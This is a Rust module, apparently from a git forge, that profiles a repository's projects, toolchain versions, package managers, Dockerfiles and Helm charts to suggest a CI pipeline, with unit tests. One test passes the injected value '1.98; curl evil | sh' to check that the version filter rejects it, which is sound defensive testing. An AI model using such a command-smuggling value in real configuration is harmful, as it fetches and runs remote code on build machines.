//! What a repository is made of, read from its files, so that the pipeline editor can propose a pipeline that fits it:
//! the projects it holds (Rust, Node, Go, Python), where, with which versions and tools, and what it ships (a
//! Dockerfile, a Helm chart). Pure: the caller lists the files and reads the few this asks for.

use std::collections::{BTreeMap, BTreeSet};

use async_trait::async_trait;
use serde::Serialize;

use crate::error::DomainError;

/// How deep the listing goes: a project at the root, in `frontend/` or in `apps/web/`. Deeper is rare and costly.
pub const MAX_DEPTH: usize = 3;
/// Past this many files the listing stops: a big repository still answers quickly, from what was seen.
pub const MAX_FILES: usize = 5_000;
/// Folders that hold what a build produces or downloads, never a project of their own.
pub const SKIPPED_DIRS: &[&str] = &[
    ".git",
    "node_modules",
    "target",
    "vendor",
    "dist",
    "build",
    ".angular",
    ".venv",
    "venv",
    "__pycache__",
    ".next",
    "coverage",
    // Only its presence matters: offline sqlx queries, which may be hundreds of files.
    ".sqlx",
];
/// A manifest larger than this is not read: real ones are a few KiB.
pub const MAX_MANIFEST_BYTES: usize = 256 * 1024;
/// At most this many manifests are read, the shallowest first: a repository built to hold thousands of them cannot make
/// one opening of the editor load them all.
pub const MAX_MANIFESTS: usize = 200;

/// The files whose content says something; the others only count by their presence (lockfiles, Dockerfile).
const READ_NAMES: &[&str] = &[
    "Cargo.toml",
    "rust-toolchain.toml",
    "rust-toolchain",
    "package.json",
    ".nvmrc",
    ".node-version",
    "go.mod",
    "pyproject.toml",
    ".python-version",
];

/// The files of a commit, read without checking it out. Paths are repo-relative and `/`-separated.
#[async_trait]
pub trait RepositoryFilesPort: Send + Sync {
    /// Every file and folder at most `max_depth` folders down, not entering those named in `skip`, stopping after
    /// `limit`. Folders are listed with a trailing `/`, the skipped ones included.
    async fn list_files_at_revision(
        &self,
        repository_disk_path: &str,
        revision: &str,
        max_depth: usize,
        skip: &[&str],
        limit: usize,
    ) -> Result<Vec<String>, DomainError>;

    /// The text of each of `paths` that is a file of at most `max_bytes` and valid UTF-8, by path. The others are left
    /// out, and a file over the limit is not loaded.
    async fn read_text_files_at_revision(
        &self,
        repository_disk_path: &str,
        revision: &str,
        paths: &[String],
        max_bytes: usize,
    ) -> Result<BTreeMap<String, String>, DomainError>;
}

#[derive(Debug, Clone, PartialEq, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct RepositoryProfile {
    pub projects: Vec<DetectedProject>,
    /// Folders holding a Dockerfile (`""` for the root).
    pub dockerfiles: Vec<String>,
    /// Folders holding a Helm chart (`Chart.yaml`).
    pub helm_charts: Vec<String>,
}

#[derive(Debug, Clone, PartialEq, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct DetectedProject {
    /// The project's folder, `""` for the root.
    pub dir: String,
    /// The files it was recognised by, repo-relative, to say why.
    pub evidence: Vec<String>,
    #[serde(flatten)]
    pub kind: ProjectKind,
}

#[derive(Debug, Clone, PartialEq, Serialize)]
#[serde(tag = "kind", rename_all = "camelCase")]
pub enum ProjectKind {
    #[serde(rename_all = "camelCase")]
    Rust {
        workspace: bool,
        /// The toolchain the repository pins (`rust-toolchain.toml`), or else the `rust-version` it requires.
        toolchain: Option<String>,
        /// A `.sqlx` folder, at its root or in a crate: queries checked against saved metadata, so the build needs no
        /// database.
        sqlx_offline: bool,
        /// sqlx with its PostgreSQL driver: its `#[sqlx::test]` tests need a running PostgreSQL.
        sqlx_postgres: bool,
    },
    #[serde(rename_all = "camelCase")]
    Node {
        package_manager: PackageManager,
        /// The major version asked for by `.nvmrc`, `.node-version` or `engines.node`.
        node_version: Option<String>,
        /// The scripts of `package.json`, by name.
        scripts: BTreeMap<String, String>,
        framework: Option<NodeFramework>,
        /// The test runner, when the dependencies name one.
        test_runner: Option<TestRunner>,
    },
    #[serde(rename_all = "camelCase")]
    Go {
        /// `major.minor` from the `go` line of `go.mod`.
        go_version: Option<String>,
    },
    #[serde(rename_all = "camelCase")]
    Python {
        tool: PythonTool,
        /// `major.minor` from `.python-version` or `requires-python`.
        python_version: Option<String>,
        pytest: bool,
        ruff: bool,
    },
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
#[serde(rename_all = "camelCase")]
pub enum PackageManager {
    Npm,
    Pnpm,
    /// Yarn 1, whose lockfile is frozen with `--frozen-lockfile`.
    YarnClassic,
    /// Yarn 2 and later (`--immutable`).
    Yarn,
    Bun,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
#[serde(rename_all = "camelCase")]
pub enum NodeFramework {
    Angular,
    React,
    Vue,
    Svelte,
    Next,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
#[serde(rename_all = "camelCase")]
pub enum TestRunner {
    Vitest,
    Jest,
    /// Needs a browser: the default node image has none.
    Karma,
    Playwright,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
#[serde(rename_all = "camelCase")]
pub enum PythonTool {
    Pip,
    Poetry,
    Uv,
}

/// The listed files whose content `detect` reads: manifests and version files, at the root of a project.
pub fn files_to_read(paths: &[String]) -> Vec<String> {
    paths
        .iter()
        .filter(|path| READ_NAMES.contains(&file_name(path)))
        .take(MAX_MANIFESTS)
        .cloned()
        .collect()
}

/// What the repository holds, from its file list and the contents of `files_to_read` (those that could be read).
pub fn detect(paths: &[String], contents: &BTreeMap<String, String>) -> RepositoryProfile {
    let tree = Tree::new(paths, contents);
    let mut projects = rust_projects(&tree);
    projects.extend(node_projects(&tree));
    projects.extend(go_projects(&tree));
    projects.extend(python_projects(&tree));
    RepositoryProfile {
        projects,
        dockerfiles: tree.dirs_with("Dockerfile"),
        helm_charts: tree.dirs_with("Chart.yaml"),
    }
}

/// The commit's files as `detect` looks at them: which exist, and what the read ones say.
struct Tree<'a> {
    paths: &'a [String],
    present: BTreeSet<&'a str>,
    contents: &'a BTreeMap<String, String>,
}

impl<'a> Tree<'a> {
    fn new(paths: &'a [String], contents: &'a BTreeMap<String, String>) -> Self {
        Self {
            paths,
            present: paths.iter().map(String::as_str).collect(),
            contents,
        }
    }

    fn has(&self, dir: &str, name: &str) -> bool {
        self.present.contains(join(dir, name).as_str())
    }

    fn read(&self, dir: &str, name: &str) -> Option<&'a str> {
        self.contents.get(&join(dir, name)).map(String::as_str)
    }

    /// The folders holding a file of that name, shallowest first, then by name.
    fn dirs_with(&self, name: &str) -> Vec<String> {
        let mut dirs: Vec<String> = self
            .paths
            .iter()
            .filter(|path| file_name(path) == name)
            .map(|path| parent(path).to_string())
            .collect();
        dirs.sort_by(|a, b| depth(a).cmp(&depth(b)).then_with(|| a.cmp(b)));
        dirs
    }

    /// Those of `names` that `dir` holds, as repo-relative paths: what a project was recognised by.
    fn evidence(&self, dir: &str, names: &[&str]) -> Vec<String> {
        names
            .iter()
            .filter(|name| self.has(dir, name))
            .map(|name| join(dir, name))
            .collect()
    }

    /// A folder of that name in `dir` or below it, listed with its trailing `/`.
    fn has_folder_inside(&self, dir: &str, name: &str) -> bool {
        let folder = format!("{name}/");
        self.paths.iter().any(|path| {
            path.strip_suffix(&folder).is_some_and(|before| {
                (before.is_empty() || before.ends_with('/'))
                    && is_inside(before.trim_end_matches('/'), dir)
            })
        })
    }

    /// A Cargo.toml in `dir` or below it that declares sqlx with its `postgres` feature, on one line as workspaces do.
    fn declares_sqlx_postgres(&self, dir: &str) -> bool {
        self.contents.iter().any(|(path, text)| {
            file_name(path) == "Cargo.toml"
                && is_inside(parent(path), dir)
                && text.lines().any(|line| {
                    line.trim_start().starts_with("sqlx") && line.contains("\"postgres\"")
                })
        })
    }
}

/// A crate inside a workspace is part of it, not a project of its own.
fn rust_projects(tree: &Tree) -> Vec<DetectedProject> {
    let mut projects: Vec<DetectedProject> = Vec::new();
    for dir in tree.dirs_with("Cargo.toml") {
        if projects.iter().any(|root| is_inside(&dir, &root.dir)) {
            continue;
        }
        let manifest = tree.read(&dir, "Cargo.toml").unwrap_or_default();
        let toolchain = tree
            .read(&dir, "rust-toolchain.toml")
            .and_then(|text| toml_string(text, "channel"))
            .or_else(|| {
                tree.read(&dir, "rust-toolchain")
                    .map(|text| text.trim().to_string())
                    .filter(|text| !text.is_empty() && !text.contains('['))
            })
            .or_else(|| toml_string(manifest, "rust-version"))
            // Only a version picks an image (rust:1.98.1): a named channel (`nightly`) or anything else read in the
            // repository is not written into the proposed pipeline.
            .filter(|version| is_plain_version(version));
        projects.push(DetectedProject {
            evidence: tree.evidence(
                &dir,
                &["Cargo.toml", "rust-toolchain.toml", "rust-toolchain"],
            ),
            kind: ProjectKind::Rust {
                workspace: toml_has_table(manifest, "workspace"),
                toolchain,
                sqlx_offline: tree.has_folder_inside(&dir, ".sqlx"),
                sqlx_postgres: tree.declares_sqlx_postgres(&dir),
            },
            dir,
        });
    }
    projects
}

/// A package of a workspace (`packages/*`) is built by the workspace's root.
fn node_projects(tree: &Tree) -> Vec<DetectedProject> {
    let mut projects = Vec::new();
    let mut workspaces: Vec<String> = Vec::new();
    for dir in tree.dirs_with("package.json") {
        if workspaces.iter().any(|root| is_inside(&dir, root)) {
            continue;
        }
        let Some(manifest) = tree
            .read(&dir, "package.json")
            .and_then(|text| serde_json::from_str::<serde_json::Value>(text).ok())
        else {
            continue;
        };
        let dependencies: BTreeSet<&str> = ["dependencies", "devDependencies"]
            .iter()
            .filter_map(|key| manifest.get(*key).and_then(|deps| deps.as_object()))
            .flat_map(|deps| deps.keys().map(String::as_str))
            .collect();
        let node_version = tree
            .read(&dir, ".nvmrc")
            .or_else(|| tree.read(&dir, ".node-version"))
            .and_then(major_version)
            .or_else(|| {
                manifest
                    .pointer("/engines/node")
                    .and_then(|value| value.as_str())
                    .and_then(major_version)
            });
        projects.push(DetectedProject {
            evidence: tree.evidence(
                &dir,
                &[
                    "package.json",
                    "package-lock.json",
                    "pnpm-lock.yaml",
                    "yarn.lock",
                    "bun.lockb",
                    "bun.lock",
                    ".nvmrc",
                    ".node-version",
                    "angular.json",
                ],
            ),
            kind: ProjectKind::Node {
                package_manager: package_manager(tree, &dir, &manifest),
                node_version,
                scripts: scripts(&manifest),
                framework: framework(tree.has(&dir, "angular.json"), &dependencies),
                test_runner: test_runner(&dependencies),
            },
            dir: dir.clone(),
        });
        if manifest.get("workspaces").is_some() || tree.has(&dir, "pnpm-workspace.yaml") {
            workspaces.push(dir);
        }
    }
    projects
}

/// By its lockfile, or else by the `packageManager` the manifest declares; npm when neither says.
fn package_manager(tree: &Tree, dir: &str, manifest: &serde_json::Value) -> PackageManager {
    let declared = manifest
        .get("packageManager")
        .and_then(|value| value.as_str())
        .unwrap_or_default();
    if tree.has(dir, "pnpm-lock.yaml") || declared.starts_with("pnpm@") {
        PackageManager::Pnpm
    } else if tree.has(dir, "bun.lockb")
        || tree.has(dir, "bun.lock")
        || declared.starts_with("bun@")
    {
        PackageManager::Bun
    } else if tree.has(dir, "yarn.lock") || declared.starts_with("yarn@") {
        // Yarn 2 and later declare themselves, or leave a .yarnrc.yml; a bare yarn.lock is Yarn 1's.
        if declared.starts_with("yarn@1") || (declared.is_empty() && !tree.has(dir, ".yarnrc.yml"))
        {
            PackageManager::YarnClassic
        } else {
            PackageManager::Yarn
        }
    } else {
        PackageManager::Npm
    }
}

fn scripts(manifest: &serde_json::Value) -> BTreeMap<String, String> {
    manifest
        .get("scripts")
        .and_then(|scripts| scripts.as_object())
        .map(|scripts| {
            scripts
                .iter()
                .filter_map(|(name, command)| {
                    command
                        .as_str()
                        .map(|command| (name.clone(), command.to_string()))
                })
                .collect()
        })
        .unwrap_or_default()
}

/// The first that applies: a Next app also depends on React, so the order matters.
fn framework(angular_json: bool, dependencies: &BTreeSet<&str>) -> Option<NodeFramework> {
    if angular_json || dependencies.contains("@angular/core") {
        return Some(NodeFramework::Angular);
    }
    [
        ("next", NodeFramework::Next),
        ("svelte", NodeFramework::Svelte),
        ("vue", NodeFramework::Vue),
        ("react", NodeFramework::React),
    ]
    .into_iter()
    .find_map(|(dependency, framework)| dependencies.contains(dependency).then_some(framework))
}

fn test_runner(dependencies: &BTreeSet<&str>) -> Option<TestRunner> {
    [
        ("vitest", TestRunner::Vitest),
        ("jest", TestRunner::Jest),
        ("karma", TestRunner::Karma),
        ("@playwright/test", TestRunner::Playwright),
    ]
    .into_iter()
    .find_map(|(dependency, runner)| dependencies.contains(dependency).then_some(runner))
}

fn go_projects(tree: &Tree) -> Vec<DetectedProject> {
    tree.dirs_with("go.mod")
        .into_iter()
        .map(|dir| {
            let go_version = tree.read(&dir, "go.mod").and_then(|text| {
                text.lines().find_map(|line| {
                    line.trim()
                        .strip_prefix("go ")
                        .map(str::trim)
                        .and_then(major_minor)
                })
            });
            DetectedProject {
                evidence: vec![join(&dir, "go.mod")],
                kind: ProjectKind::Go { go_version },
                dir,
            }
        })
        .collect()
}

/// A folder with a `pyproject.toml`, or only a `requirements.txt`.
fn python_projects(tree: &Tree) -> Vec<DetectedProject> {
    let mut dirs = tree.dirs_with("pyproject.toml");
    for dir in tree.dirs_with("requirements.txt") {
        if !dirs.contains(&dir) {
            dirs.push(dir);
        }
    }
    dirs.into_iter()
        .map(|dir| {
            let pyproject = tree.read(&dir, "pyproject.toml").unwrap_or_default();
            let tool = if tree.has(&dir, "uv.lock") {
                PythonTool::Uv
            } else if tree.has(&dir, "poetry.lock") || toml_has_table(pyproject, "tool.poetry") {
                PythonTool::Poetry
            } else {
                PythonTool::Pip
            };
            let python_version = tree
                .read(&dir, ".python-version")
                .and_then(major_minor_in)
                .or_else(|| {
                    toml_string(pyproject, "requires-python")
                        .and_then(|range| major_minor_in(&range))
                });
            let has_test_files = tree.paths.iter().any(|path| {
                path.starts_with(&join(&dir, "tests/")) && file_name(path).starts_with("test_")
            });
            DetectedProject {
                evidence: tree.evidence(
                    &dir,
                    &[
                        "pyproject.toml",
                        "requirements.txt",
                        "uv.lock",
                        "poetry.lock",
                    ],
                ),
                kind: ProjectKind::Python {
                    tool,
                    python_version,
                    pytest: pyproject.contains("pytest") || has_test_files,
                    ruff: pyproject.contains("ruff")
                        || tree.has(&dir, "ruff.toml")
                        || tree.has(&dir, ".ruff.toml"),
                },
                dir,
            }
        })
        .collect()
}

fn file_name(path: &str) -> &str {
    path.rsplit('/').next().unwrap_or(path)
}

fn parent(path: &str) -> &str {
    path.rsplit_once('/').map_or("", |(dir, _)| dir)
}

fn depth(dir: &str) -> usize {
    if dir.is_empty() {
        0
    } else {
        dir.matches('/').count() + 1
    }
}

fn join(dir: &str, name: &str) -> String {
    if dir.is_empty() {
        name.to_string()
    } else {
        format!("{dir}/{name}")
    }
}

/// Whether `dir` is `root` or below it.
fn is_inside(dir: &str, root: &str) -> bool {
    root.is_empty() || dir == root || dir.starts_with(&format!("{root}/"))
}

/// A `[name]` table header, alone on its line (`[workspace]`, not `[workspace.dependencies]`).
fn toml_has_table(text: &str, name: &str) -> bool {
    text.lines().any(|line| line.trim() == format!("[{name}]"))
}

/// The string value of the first `key = "value"` line: enough for the few keys read here, without a TOML parser.
fn toml_string(text: &str, key: &str) -> Option<String> {
    text.lines().find_map(|line| {
        let (name, value) = line.split_once('=')?;
        if name.trim() != key {
            return None;
        }
        let value = value.trim().trim_matches(|c| c == '"' || c == '\'');
        (!value.is_empty()).then(|| value.to_string())
    })
}

/// `1`, `1.98` or `1.98.1`: numbers and dots, nothing a pipeline file or a shell could read otherwise.
fn is_plain_version(text: &str) -> bool {
    let parts: Vec<&str> = text.split('.').collect();
    parts.len() <= 3
        && parts
            .iter()
            .all(|part| !part.is_empty() && part.chars().all(|c| c.is_ascii_digit()))
}

/// The major version in `v22.4.1`, `22`, `^26.10.0`, `>=20 <23`: the first number.
fn major_version(text: &str) -> Option<String> {
    let start = text.find(|c: char| c.is_ascii_digit())?;
    let digits: String = text[start..]
        .chars()
        .take_while(char::is_ascii_digit)
        .collect();
    (!digits.is_empty()).then_some(digits)
}

/// `1.23` from `1.23.4`; `None` without a minor.
fn major_minor(text: &str) -> Option<String> {
    let mut parts = text.split('.');
    let major = parts
        .next()
        .filter(|part| !part.is_empty() && part.chars().all(|c| c.is_ascii_digit()))?;
    let minor: String = parts
        .next()?
        .chars()
        .take_while(char::is_ascii_digit)
        .collect();
    (!minor.is_empty()).then(|| format!("{major}.{minor}"))
}

/// The first `major.minor` in a version or a range (`>=3.11`, `3.12.4`).
fn major_minor_in(text: &str) -> Option<String> {
    let start = text.find(|c: char| c.is_ascii_digit())?;
    major_minor(
        text[start..]
            .split(|c: char| !(c.is_ascii_digit() || c == '.'))
            .next()?,
    )
}

#[cfg(test)]
mod tests {
    use super::*;

    fn files(paths: &[&str]) -> Vec<String> {
        paths.iter().map(|path| path.to_string()).collect()
    }

    fn contents(entries: &[(&str, &str)]) -> BTreeMap<String, String> {
        entries
            .iter()
            .map(|(path, text)| (path.to_string(), text.to_string()))
            .collect()
    }

    /// This repository's own layout: a Rust workspace with offline queries, two Angular apps, an image and a chart.
    #[test]
    fn reads_a_rust_workspace_with_two_angular_apps_an_image_and_a_chart() {
        let paths = files(&[
            "Cargo.toml",
            "rust-toolchain.toml",
            ".sqlx/",
            "crates/api/Cargo.toml",
            "Dockerfile",
            "helm/ferrisgit/Chart.yaml",
            "frontend/package.json",
            "frontend/package-lock.json",
            "frontend/angular.json",
            "website/package.json",
            "website/package-lock.json",
        ]);
        let read = contents(&[
            (
                "Cargo.toml",
                "[workspace]\nmembers = [\"crates/*\"]\n\n[workspace.package]\nrust-version = \"1.98\"\n\n[workspace.dependencies]\nsqlx = { version = \"0.9\", features = [\"runtime-tokio\", \"postgres\"] }\n",
            ),
            (
                "rust-toolchain.toml",
                "[toolchain]\nchannel = \"1.98.1\"\ncomponents = [\"clippy\"]\n",
            ),
            ("crates/api/Cargo.toml", "[package]\nname = \"api\"\n"),
            (
                "frontend/package.json",
                r#"{"scripts":{"build":"ng build","test":"ng test"},"engines":{"node":"^26.10.0"},"dependencies":{"@angular/core":"^22"},"devDependencies":{"vitest":"^5"}}"#,
            ),
            (
                "website/package.json",
                r#"{"scripts":{"build":"ng build","test":"ng test --watch=false","lint":"eslint ."},"dependencies":{"@angular/core":"^22"}}"#,
            ),
        ]);

        let profile = detect(&paths, &read);

        assert_eq!(profile.projects.len(), 3, "{profile:#?}");
        assert_eq!(
            profile.projects[0],
            DetectedProject {
                dir: String::new(),
                evidence: files(&["Cargo.toml", "rust-toolchain.toml"]),
                kind: ProjectKind::Rust {
                    workspace: true,
                    toolchain: Some("1.98.1".into()),
                    sqlx_offline: true,
                    sqlx_postgres: true
                }
            }
        );
        let ProjectKind::Node {
            package_manager,
            node_version,
            scripts,
            framework,
            test_runner,
        } = &profile.projects[1].kind
        else {
            panic!("{:?}", profile.projects[1])
        };
        assert_eq!(profile.projects[1].dir, "frontend");
        assert_eq!(
            (
                *package_manager,
                node_version.as_deref(),
                *framework,
                *test_runner
            ),
            (
                PackageManager::Npm,
                Some("26"),
                Some(NodeFramework::Angular),
                Some(TestRunner::Vitest)
            )
        );
        assert_eq!(scripts.keys().collect::<Vec<_>>(), ["build", "test"]);
        assert_eq!(profile.projects[2].dir, "website");
        assert_eq!(profile.dockerfiles, [""]);
        assert_eq!(profile.helm_charts, ["helm/ferrisgit"]);
    }

    #[test]
    fn reads_at_most_so_many_manifests_the_shallowest_first() {
        let paths: Vec<String> = (0..MAX_MANIFESTS + 50)
            .map(|n| format!("app{n}/package.json"))
            .collect();

        let read = files_to_read(&paths);

        assert_eq!(read.len(), MAX_MANIFESTS);
        assert_eq!(read[0], "app0/package.json");
    }

    #[test]
    fn writes_into_the_image_only_a_toolchain_that_is_a_plain_version() {
        let toolchain = |channel: &str| {
            let profile = detect(
                &files(&["Cargo.toml", "rust-toolchain.toml"]),
                &contents(&[
                    ("Cargo.toml", "[package]\n"),
                    (
                        "rust-toolchain.toml",
                        &format!("[toolchain]\nchannel = \"{channel}\"\n"),
                    ),
                ]),
            );
            match &profile.projects[0].kind {
                ProjectKind::Rust { toolchain, .. } => toolchain.clone(),
                other => panic!("{other:?}"),
            }
        };
        assert_eq!(toolchain("1.98.1"), Some("1.98.1".to_string()));
        assert_eq!(toolchain("1.98"), Some("1.98".to_string()));
        assert_eq!(toolchain("1.98; curl evil | sh"), None);
        assert_eq!(toolchain("1.98-nightly"), None);
        assert_eq!(toolchain("1..2"), None);
    }

    #[test]
    fn asks_to_read_only_the_files_that_say_something() {
        let paths = files(&[
            "Cargo.toml",
            "Cargo.lock",
            "src/main.rs",
            "web/package.json",
            "web/package-lock.json",
            "web/.nvmrc",
            "go.mod",
            "README.md",
        ]);

        assert_eq!(
            files_to_read(&paths),
            files(&["Cargo.toml", "web/package.json", "web/.nvmrc", "go.mod"])
        );
    }

    #[test]
    fn finds_sqlx_offline_data_and_its_postgres_driver_in_a_member_crate_too() {
        let paths = files(&[
            "Cargo.toml",
            "crates/db/Cargo.toml",
            "crates/db/.sqlx/",
            "other/.sqlx/",
        ]);
        let read = contents(&[
            ("Cargo.toml", "[workspace]\nmembers = [\"crates/*\"]\n"),
            (
                "crates/db/Cargo.toml",
                "[dependencies]\nsqlx = { version = \"0.9\", features = [\"postgres\"] }\n",
            ),
        ]);

        let profile = detect(&paths, &read);

        assert!(matches!(
            &profile.projects[0].kind,
            ProjectKind::Rust {
                sqlx_offline: true,
                sqlx_postgres: true,
                ..
            }
        ));

        let sqlite = detect(
            &files(&["Cargo.toml", "x.sqlx/"]),
            &contents(&[(
                "Cargo.toml",
                "[dependencies]\nsqlx = { version = \"0.9\", features = [\"sqlite\"] }\n",
            )]),
        );
        assert!(matches!(
            &sqlite.projects[0].kind,
            ProjectKind::Rust {
                sqlx_offline: false,
                sqlx_postgres: false,
                ..
            }
        ));
    }

    #[test]
    fn takes_the_rust_version_when_no_toolchain_is_pinned_and_ignores_a_named_channel() {
        let profile = detect(
            &files(&["Cargo.toml"]),
            &contents(&[(
                "Cargo.toml",
                "[package]\nname = \"x\"\nrust-version = \"1.80\"\n",
            )]),
        );
        assert!(
            matches!(&profile.projects[0].kind, ProjectKind::Rust { workspace: false, toolchain: Some(version), sqlx_offline: false, sqlx_postgres: false } if version == "1.80")
        );

        let nightly = detect(
            &files(&["Cargo.toml", "rust-toolchain.toml"]),
            &contents(&[
                ("Cargo.toml", "[package]\n"),
                (
                    "rust-toolchain.toml",
                    "[toolchain]\nchannel = \"nightly\"\n",
                ),
            ]),
        );
        assert!(matches!(
            &nightly.projects[0].kind,
            ProjectKind::Rust {
                toolchain: None,
                ..
            }
        ));
    }

    #[test]
    fn knows_the_package_manager_by_its_lockfile_or_the_declared_one() {
        let manager = |paths: &[&str], manifest: &str| {
            let profile = detect(&files(paths), &contents(&[("package.json", manifest)]));
            match &profile.projects[0].kind {
                ProjectKind::Node {
                    package_manager, ..
                } => *package_manager,
                other => panic!("{other:?}"),
            }
        };
        assert_eq!(
            manager(&["package.json", "pnpm-lock.yaml"], "{}"),
            PackageManager::Pnpm
        );
        assert_eq!(
            manager(&["package.json", "yarn.lock"], "{}"),
            PackageManager::YarnClassic
        );
        assert_eq!(
            manager(&["package.json", "yarn.lock", ".yarnrc.yml"], "{}"),
            PackageManager::Yarn
        );
        assert_eq!(
            manager(
                &["package.json", "yarn.lock"],
                r#"{"packageManager":"yarn@4.5.0"}"#
            ),
            PackageManager::Yarn
        );
        assert_eq!(
            manager(&["package.json", "bun.lock"], "{}"),
            PackageManager::Bun
        );
        assert_eq!(manager(&["package.json"], "{}"), PackageManager::Npm);
    }

    #[test]
    fn reads_the_node_version_from_nvmrc_before_engines() {
        let profile = detect(
            &files(&["package.json", ".nvmrc"]),
            &contents(&[
                ("package.json", r#"{"engines":{"node":">=18"}}"#),
                (".nvmrc", "v22.11.0\n"),
            ]),
        );
        assert!(
            matches!(&profile.projects[0].kind, ProjectKind::Node { node_version: Some(version), .. } if version == "22")
        );
    }

    #[test]
    fn leaves_the_packages_of_a_node_workspace_to_its_root_but_keeps_separate_apps() {
        let paths = files(&[
            "package.json",
            "packages/ui/package.json",
            "tools/package.json",
        ]);
        let workspace = detect(
            &paths,
            &contents(&[
                ("package.json", r#"{"workspaces":["packages/*"]}"#),
                ("packages/ui/package.json", "{}"),
                ("tools/package.json", "{}"),
            ]),
        );
        assert_eq!(
            workspace
                .projects
                .iter()
                .map(|p| p.dir.as_str())
                .collect::<Vec<_>>(),
            [""]
        );

        let separate = detect(
            &paths,
            &contents(&[
                ("package.json", "{}"),
                ("packages/ui/package.json", "{}"),
                ("tools/package.json", "{}"),
            ]),
        );
        assert_eq!(
            separate
                .projects
                .iter()
                .map(|p| p.dir.as_str())
                .collect::<Vec<_>>(),
            ["", "tools", "packages/ui"]
        );
    }

    #[test]
    fn skips_a_package_json_that_cannot_be_read() {
        let profile = detect(
            &files(&["package.json"]),
            &contents(&[("package.json", "{ not json")]),
        );
        assert!(profile.projects.is_empty());
    }

    #[test]
    fn reads_go_and_python_projects() {
        let paths = files(&[
            "svc/go.mod",
            "ml/pyproject.toml",
            "ml/uv.lock",
            "ml/.python-version",
            "scripts/requirements.txt",
            "scripts/tests/test_x.py",
        ]);
        let read = contents(&[
            ("svc/go.mod", "module example.com/svc\n\ngo 1.23.4\n"),
            (
                "ml/pyproject.toml",
                "[project]\nrequires-python = \">=3.11\"\ndependencies = []\n[dependency-groups]\ndev = [\"pytest>=8\", \"ruff\"]\n",
            ),
            ("ml/.python-version", "3.12\n"),
        ]);

        let profile = detect(&paths, &read);

        assert_eq!(
            profile.projects[0].kind,
            ProjectKind::Go {
                go_version: Some("1.23".into())
            }
        );
        assert_eq!(
            profile.projects[1].kind,
            ProjectKind::Python {
                tool: PythonTool::Uv,
                python_version: Some("3.12".into()),
                pytest: true,
                ruff: true
            }
        );
        assert_eq!(
            profile.projects[2].kind,
            ProjectKind::Python {
                tool: PythonTool::Pip,
                python_version: None,
                pytest: true,
                ruff: false
            }
        );
        assert_eq!(
            profile.projects[2].evidence,
            files(&["scripts/requirements.txt"])
        );
    }

    #[test]
    fn an_empty_repository_has_nothing_to_offer() {
        assert_eq!(
            detect(&[], &BTreeMap::new()),
            RepositoryProfile {
                projects: vec![],
                dockerfiles: vec![],
                helm_charts: vec![]
            }
        );
    }

    #[test]
    fn serialises_for_the_editor_with_the_kind_beside_the_folder() {
        let profile = detect(&files(&["go.mod"]), &contents(&[("go.mod", "go 1.22\n")]));
        assert_eq!(
            serde_json::to_value(&profile.projects[0]).unwrap(),
            serde_json::json!({ "dir": "", "evidence": ["go.mod"], "kind": "go", "goVersion": "1.22" })
        );
    }

    /// The pipeline editor reads this JSON with types of its own (pipeline-definitions.service.ts): a sample of every
    /// field and every value sits beside them, and the frontend's tests check its types against it. This test keeps the
    /// sample what the server sends. After a deliberate change: `UPDATE_CONTRACTS=1 cargo test -p ferrisgit-domain`.
    #[test]
    fn the_sample_the_frontend_checks_its_types_against_is_what_the_server_sends() {
        use PackageManager::*;
        let package_managers = [Npm, Pnpm, YarnClassic, Yarn, Bun];
        let frameworks = [
            NodeFramework::Angular,
            NodeFramework::React,
            NodeFramework::Vue,
            NodeFramework::Svelte,
            NodeFramework::Next,
        ];
        let test_runners = [
            TestRunner::Vitest,
            TestRunner::Jest,
            TestRunner::Karma,
            TestRunner::Playwright,
        ];
        let python_tools = [PythonTool::Pip, PythonTool::Poetry, PythonTool::Uv];
        // A value added to one of these enums fails to compile here until it is listed above.
        for value in package_managers {
            match value {
                Npm | Pnpm | YarnClassic | Yarn | Bun => {}
            }
        }
        for value in frameworks {
            match value {
                NodeFramework::Angular
                | NodeFramework::React
                | NodeFramework::Vue
                | NodeFramework::Svelte
                | NodeFramework::Next => {}
            }
        }
        for value in test_runners {
            match value {
                TestRunner::Vitest
                | TestRunner::Jest
                | TestRunner::Karma
                | TestRunner::Playwright => {}
            }
        }
        for value in python_tools {
            match value {
                PythonTool::Pip | PythonTool::Poetry | PythonTool::Uv => {}
            }
        }
        let project = |dir: &str, kind: ProjectKind| DetectedProject {
            dir: dir.to_string(),
            evidence: vec![
                format!("{dir}/manifest")
                    .trim_start_matches('/')
                    .to_string(),
            ],
            kind,
        };
        let profile = RepositoryProfile {
            projects: vec![
                project(
                    "",
                    ProjectKind::Rust {
                        workspace: true,
                        toolchain: Some("1.98.1".to_string()),
                        sqlx_offline: true,
                        sqlx_postgres: true,
                    },
                ),
                project(
                    "web",
                    ProjectKind::Node {
                        package_manager: Npm,
                        node_version: Some("26".to_string()),
                        scripts: BTreeMap::from([("test".to_string(), "ng test".to_string())]),
                        framework: Some(NodeFramework::Angular),
                        test_runner: Some(TestRunner::Vitest),
                    },
                ),
                project(
                    "cli",
                    ProjectKind::Go {
                        go_version: Some("1.23".to_string()),
                    },
                ),
                project(
                    "tools",
                    ProjectKind::Python {
                        tool: PythonTool::Uv,
                        python_version: None,
                        pytest: true,
                        ruff: false,
                    },
                ),
            ],
            dockerfiles: vec![String::new()],
            helm_charts: vec!["chart".to_string()],
        };
        let sample = serde_json::to_string_pretty(&serde_json::json!({
            "profile": profile,
            "packageManagers": package_managers,
            "frameworks": frameworks,
            "testRunners": test_runners,
            "pythonTools": python_tools,
        }))
        .unwrap()
            + "\n";

        let path = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join(
            "../../frontend/src/app/pipelines/pipeline-editor/repository-profile.contract.json",
        );
        if std::env::var_os("UPDATE_CONTRACTS").is_some() {
            std::fs::write(&path, &sample).unwrap();
        }
        let checked_in = std::fs::read_to_string(&path).unwrap_or_default();
        assert!(
            checked_in == sample,
            "{} is not what the server sends: rerun with UPDATE_CONTRACTS=1, then fix the frontend's types until its tests pass",
            path.display()
        );
    }
}
